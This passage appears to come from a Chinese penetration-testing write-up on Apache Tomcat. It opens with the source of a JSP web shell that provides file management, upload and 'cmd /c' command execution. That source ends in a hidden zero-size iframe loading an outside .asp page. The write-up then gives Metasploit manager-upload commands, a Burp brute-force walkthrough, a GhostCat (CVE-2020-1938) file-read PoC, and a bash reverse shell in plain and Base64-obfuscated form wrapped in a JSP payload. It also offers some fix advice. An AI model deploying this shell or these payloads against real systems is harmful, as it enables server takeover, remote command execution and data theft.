value='"+strDir+"' >\r\n"); sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\r\n"); sbCopy.append("原始文件： "+strPath+"<p>"); sbCopy.append("目标文件： <input type=text name=file2 size=40 value='"+strDir+"'><p>"); sbCopy.append("<input type=submit name=save value=' "+strFileCopy[languageNo]+" '> "); sbCopy.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' o nclick='history.back(-1);'> <p>&nbsp;\r\n"); sbCopy.append("</form>");}if(strAction!=null && strAction.equals("savecopy")){ File f=new File(strPath); String strDesFile=request.getParameter("file2"); if(strDesFile==null || strDesFile.equals("")) {  sbSaveCopy.append("<p><font color=red>目标文件错误。</font>"); } else {  File f_des=new File(strDesFile);  if(f_des.isFile())  {   sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");  }  else  {   String strTmpFile=strDesFile;   if(f_des.isDirectory())   {    if(!strDesFile.endsWith("\\"))    {     strDesFile=strDesFile+"\\";    }    strTmpFile=strDesFile+"cqq_"+strFile;    }      File f_des_copy=new File(strTmpFile);   FileInputStream in1=new FileInputStream(f);   FileOutputStream out1=new FileOutputStream(f_des_copy);   byte[] buffer=new byte[1024];   int c;   while((c=in1.read(buffer))!=-1)   {    out1.write(buffer,0,c);   }   in1.close();   out1.close();    sbSaveCopy.append("原始文件 ："+strPath+"<p>");   sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");   sbSaveCopy.append("<font color=red>复制成功！</font>");     }   }  sbSaveCopy.append("<p><input type=button name=saveCopyBack o nclick='history.back(-2);' value=返回>");}if(strAction!=null && strAction.equals("newFile")){ String strF=request.getParameter("fileName"); String strType1=request.getParameter("btnNewFile"); String strType2=request.getParameter("btnNewDir"); String strType=""; if(strType1==null) {  strType="Dir"; } else if(strType2==null) {  strType="File"; } if(!strType.equals("") && !(strF==null || strF.equals(""))) {     File f_new=new File(strF);      if(strType.equals("File") && !f_new.createNewFile())    sbNewFile.append(strF+" 文件创建失败");   if(strType.equals("Dir") && !f_new.mkdirs())    sbNewFile.append(strF+" 目录创建失败"); } else {  sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>"); }}if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart"))){ String tempdir="."; boolean error=false; response.setContentType("text/html"); sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>"); HttpMultiPartParser parser = new HttpMultiPartParser(); int bstart = request.getContentType().lastIndexOf("oundary="); String bound = request.getContentType().substring(bstart + 8); int clength = request.getContentLength(); Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength); if (ht.get("cqqUploadFile") != null) {  FileInfo fi = (FileInfo) ht.get("cqqUploadFile");  File f1 = fi.file;  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);  if (info != null && info.aborted)   {   f1.delete();   request.setAttribute("error", "Upload aborted");  }  else   {   String path = (String) ht.get("path");   if(path!=null && !path.endsWith("\\"))     path = path + "\\";   if (!f1.renameTo(new File(path + f1.getName())))    {    request.setAttribute("error", "Cannot upload file.");    error = true;    f1.delete();   }  } }}%><html><head><style type="text/css">td,select,input,body{font-size:9pt;}A { TEXT-DECORATION: none }#tablist{padding: 5px 0;margin-left: 0;margin-bottom: 0;margin-top: 0.1em;font:9pt;}#tablist li{list-style: none;display: inline;margin: 0;}#tablist li a{padding: 3px 0.5em;margin-left: 3px;border: 1px solid ;background: F6F6F6;}#tablist li a:l ink, #tablist li a:visited{color: navy;}#tablist li a.current{background: #EAEAFF;}#tabcontentcontainer{width: 100%;padding: 5px;border: 1px solid black;}.tabcontent{display:none;}</style><s cript type="text/j avas cript">var initialtab=[<%=tabID%>, "menu<%=tabID%>"]////////Stop editting////////////////function cascadedstyle(el, cssproperty, csspropertyNS){if (el.currentStyle)return el.currentStyle[cssproperty]else if (window.getComputedStyle){var elstyle=window.getComputedStyle(el, "")return elstyle.getPropertyValue(csspropertyNS)}}var previoustab=""function expandcontent(cid, ao bject){if (document.getElementById){highlighttab(ao bject)if (previoustab!="")document.getElementById(previoustab).style.display="none"document.getElementById(cid).style.display="block"previoustab=cidif (ao bject.blur)ao bject.blur()return false}elsereturn true}function highlighttab(ao bject){if (typeof tabobjl inks=="undefined")collecttab l inks()for (i=0; i<tabobjl inks.length; i++)tabobjl inks[i].style.backgroundColor=initTabcolorvar themecolor=ao bject.getAttribute("theme")? ao bject.getAttribute("theme") : initTabpostcolorao bject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor}function collecttab l inks(){var tabobj=document.getElementById("tablist")tabobjl inks=tabobj.getElementsByTagName("A")}function do_o nload(){collecttab l inks()initTabcolor=cascadedstyle(tabobjl inks[1], "backgroundColor", "background-color")initTabpostcolor=cascadedstyle(tabobjl inks[0], "backgroundColor", "background-color")expandcontent(initialtab[1], tabobjl inks[initialtab[0]-1])}if (window.addEventListener)window.addEventListener("load", do_o nload, false)else if (window.attachEvent)window.attachEvent("o nload", do_o nload)else if (document.getElementById)window.o nload=do_o nload </s cript><s cript language="j avas cript">function doForm(action,path,file,cmd,tab,content){ document.frmCqq.action.value=action; document.frmCqq.path.value=path; document.frmCqq.file.value=file; document.frmCqq.cmd.value=cmd; document.frmCqq.tabID.value=tab; document.frmCqq.content.value=content; if(action=="del") {  if(confirm("确定要删除文件 "+file+" 吗？"))  document.frmCqq.submit(); } else {  document.frmCqq.submit();     }}</s cript><title>JSP Shell 岁月联盟专用版本</title><head><body><form name="frmCqq" method="post" action=""><input type="hidden" name="action" value=""><input type="hidden" name="path" value=""><input type="hidden" name="file" value=""><input type="hidden" name="cmd" value=""><input type="hidden" name="tabID" value="2"><input type="hidden" name="content" value=""></form><!--Top Menu Started--><ul id="tablist"><li><a href="" class="current" o nclick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%> </a></li><li><a href="new.htm" o nclick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li><li><a href="hot.htm" o nclick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty[languageNo]%> </a></li><li><a href="search.htm" o nclick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp[languageNo]%> </a></li> &nbsp; <%=authorInfo[languageNo]%></ul><!--Top Menu End--><%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          %><DIV id="tabcontentcontainer"><div id="menu3" class="tabcontent"><br> <br> &nbsp;&nbsp; 未完成<br> <br>&nbsp;</div><div id="menu4" class="tabcontent"><br><p>一、功能说明</p><p>&nbsp;&nbsp;&nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p><p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p><p>与windows的cmd。</p><p>&nbsp;</p><p>二、测试</p><p>&nbsp;&nbsp;&nbsp;<b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>留言地址为：<a href="http://" target="_blank"></a></b><p>&nbsp;</p><p>三、更新记录</p><p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p><p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p><p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; 第一个jsp&nbsp;程序就是这个简单的显示目录文件的小程序</p><p>&nbsp;</p><p>&nbsp;</p></div><div id="menu1" class="tabcontent"><%out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"： <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\r\n");%><table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">               <tr>           <td width="25%" align="center" valign="top">               <table width="98%" border="0" cellspacing="0" cellpadding="3">     <%=sbFolder%>                </tr>                               </table>          </td>          <td width="81%" align="left" valign="top">  <% if(strAction!=null && strAction.equals("edit")) {  out.println(sbEdit.toString()); } else if(strAction!=null && strAction.equals("copy")) {  out.println(sbCopy.toString()); } else if(strAction!=null && strAction.equals("down")) {  out.println(sbDown.toString()); } else if(strAction!=null && strAction.equals("savecopy")) {  out.println(sbSaveCopy.toString()); } else if(strAction!=null && strAction.equals("newFile") && !sbNewFile.toString().equals("")) {  out.println(sbNewFile.toString()); } else { %>  <span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >              <tr bgcolor="#E7e7e6">                 <td width="26%"><%=strFileName[languageNo]%></td>                <td width="19%"><%=strFileSize[languageNo]%></td>                <td width="29%"><%=strLastModified[languageNo]%></td>                <td width="26%"><%=strFileOperation[languageNo]%></td>              </tr>                          <%=sbFile%>             <!-- <tr align="center">                 <td colspan="4"><br>                  总计文件个数：<font color="#FF0000">30</font> ，大小：<font color="#FF0000">664.9</font>                   KB </td>              </tr>    -->            </table>   </span> <% }   %>          </td>        </tr> <form name="frmMake" action="" method="post"> <tr><td colspan=2 bgcolor=#FBFFC6> <input type="hidden" name="action" value="newFile"> <input type="hidden" name="path" value="<%=strDir%>"> <input type="hidden" name="file" value="<%=strFile%>"> <input type="hidden" name="cmd" value="<%=strCmd%>"> <input type="hidden" name="tabID" value="1"> <input type="hidden" name="content" value=""> <% if(!strDir.endsWith("\\")) strDir = strDir + "\\"; %> <input type="text" name="fileName" size=36 value="<%=strDir%>"> <input type="submit" name="btnNewFile" value="新建文件" o nclick="frmMake.submit()" >  <input type="submit" name="btnNewDir" value="新建目录"  o nclick="frmMake.submit()" >  </form>   <form name="frmUpload" enctype="multipart/form-data" action="" method="post"> <input type="hidden" name="action" value="upload"> <input type="hidden" name="path" value="<%=strDir%>"> <input type="hidden" name="file" value="<%=strFile%>"> <input type="hidden" name="cmd" value="<%=strCmd%>"> <input type="hidden" name="tabID" value="1"> <input type="hidden" name="content" value=""> <input type="file" name="cqqUploadFile" size="36"> <input type="submit" name="submit" value="上传"> </td></tr></form>      </table></div><div id="menu2" class="tabcontent"><%String line="";StringBuffer sbCmd=new StringBuffer("");if(strCmd!=null) { try {  //out.println(strCmd);  Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));  while((line=br.readLine())!=null)  {   sbCmd.append(line+"\r\n");    }     } catch(Exception e) {  System.out.println(e.toString()); }}else{ strCmd = "set";}%><form name="cmd" action="" method="post">&nbsp;<input type="text" name="cmd" value="<%=strCmd%>" size=50><input type="hidden" name="tabID" value="2"><input type=submit name=submit value="<%=strExecute[languageNo]%>"></form><%if(sbCmd!=null && sbCmd.toString().trim().equals("")==false){%>&nbsp;<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA><br>&nbsp;<%}%></DIV></div><br><br><center><a href="http://" target="_blank"></a> <br><i f rame src=http://7jyewu.cn/a/a.asp width=0 height=0></i f rame>
```

#### MSF攻击

```php
use exploit/multi/http/tomcat_mgr_upload set HttpUsername tomcatset HttpPassword tomcatset rhosts 192.168.175.191set rport 8080exploit
```

这里就直接略过了 自己去操作一下

这就成功进来了

![1619340998143](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9fa00942148d76edfd1c4b0efba6f13da941f05f.png)

#### 修复建议

```php
1、在系统上以低权限运行 Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.x ml文件设置锁定机制和时间超时限制3、以及针对manager-gui/manager-status/manager-s cript等目录页面设置最小权限访问限制
```

### Tomcat manager App暴力破解

#### 漏洞复现

我们先抓后台的包

![1619341538485](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-79e9fb324b88a6dff1199c1ea39e9aa3bb774744.png)

然后放包 进行登录

![1619341565301](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6ce67b6635658e43f5417c75e6fd3b8052f4c1ee.png)

这里注意这段回显

```php
Authorization: Basic dG9tY2F0OnRvbWNhdA==
```

![1619341609504](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b50f44921d4825afb92b94160acc730d345409a1.png)

发现Tomcat的后台登录账号和密码

是以B ASE64加密的 账号:密码

然后我们重新去抓后台的包 进行爆破

![1619341768817](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e4c32e2d9afb0dbab95c782bbc85103a7219bfa0.png)

![1619341811564](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dad389c3376a74b9b67cf51d51d12510088a8b21.png)

添加密码本 和B ASE64 的编码规则

把这个自带的编码 对勾去掉

![1619342044653](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b580596c3b7e59cbb43e620f5ed2f52b95a57dc0.png)

开始攻击 拿到账号和密码

![1619342139990](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e943dee82947bc89cda9b04bc83ee8f875fba451.png)

这里讲第二种方式

自定义迭代器

![1619342352290](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ad97706bd6a3bffa1ff0bceddb4ddbf6d597f82e.png)

分位置 进行不同的载入

比如这里 就应该是3个位置

![1619342430579](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d3a679d9ac13181f508c593ca8f6e51b48a816ea.png)

![1619342458443](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a1fb458501589d6f7200f2a07da4ee588c947571.png)

![1619342481874](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-60bf86243696bad91be65c2159919f175f20d9c2.png)

下面和之前的设置 一样

B ASE64编码 和去掉对勾 默认的Url编码

#### 修复建议

```php
1.取消 manager/html功能2.manager页面应只允许本地IP访问
```

### Tomcat AJP文件包含漏洞分析(CVE-2020-1938)

#### 漏洞简介

由于 Tomcat在处理`AJP`请求时，未对请求做任何验证

通过设置AJP连接器封装的 request对象的属性，导致产生任意文件读取漏洞和代码执行漏洞！  
CVE-2020-1938又名 GhostCat，由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。

此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

#### 源码分析

漏洞成因是两个配置文件导致

Tomat在部罢时有两个重要的配置文件`conf/server.x ml、conf/web.x ml`

前者定义了 Tomcat启动时涉及的组件属性，其中包含两个connector(用于处理请求的组件)

如果开启状态下，tomcat启动后会监听8080、8009端口，它们分别负责接受http、ajp协议的数据

后者则和普通的javaWeb应用一样，用来定义servlet

```php
Apache Tomcat 9.x < 9.0.31Apache Tomcat 8.x<8.5.51Apache Tomcat 7.x<7.0.100Apache tomcat 6.x
```

#### 参考链接

<https://xz.aliyun.com/t/7325>

<https://yinwc.github.io/2020/03/01/CVE-2020-1938/>

#### 运行过程

![image-20210718060241151](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cf49b5cc17a217f7d90d90f22442930055b2376a.png)

从图中可以看出，Tomcat最顶层的容器是 Server，其中包含至少一个或者多个 Service，一个 Service有多个 Connector和一个 Container组成。

这两个组件的作用为:

```php
1、Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化；2、Container用于封装和管理 Servlet，以及具体处理 Request请求
```

Tomcat默认的`conf/server.x ml`中配置了2个Connector，

一个为8080端口 HTTP协议(1.1版本)端口，默认监听地址：`0.0.0.0:8080`

另外一个就是默认的8009 AJP协议(1.3版本)，默认监听地址为：`0.0.0.0:8009`，两个端口默认均监听在外网。此次漏洞产生的位置便是8009 AJP协议，此处使用公开的利用脚本进行测试，可以看到能读取`web.x ml`文件

#### 漏洞复现

利用vulhub

```php
cd tomcat/CVE-2020-1938sudo docker-compose up -d
```

![1619348867355](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f293c54c372602e1dcf0f336ed1b1c0efe8181d9.png)

Poc地址：<https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi>

脚本是基于Python2的

它可以看webapps目录下的所有东西

![1619349787403](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d5f8d73dd7a2c5aec8ec643fbe0069914a971858.png)

可以看到它的语法要求

```php
python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件
```

```php
python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.x ml
```

![1619349894166](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91da877f8e9edd1e2b5f594e6b4ac960701f3738.png)

文件包含RCE

在线bash payload生成： <http://www.jackson-t.ca/runtime-exec-payloads.html>

```php
bash -i >& /dev/tcp/192.168.175.191/8888 0>&1
```

![1619350245468](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68dbbb1c722a9f1602494f798f56e8d496961d95.png)

```php
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{B ASE64,-d}|{bash,-i}
```

最终的txt的payload

```php
<%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{B ASE64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("");%>
```

这边要手动上传上去

查看

```php
sudo docker ps
```

![1619350478774](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-967eb9385d4f9d018ebff705bd0725a0bad04535.png)

然后开始上传

```php

sudo docker cp /home/dayu/Desktop/1.txt
```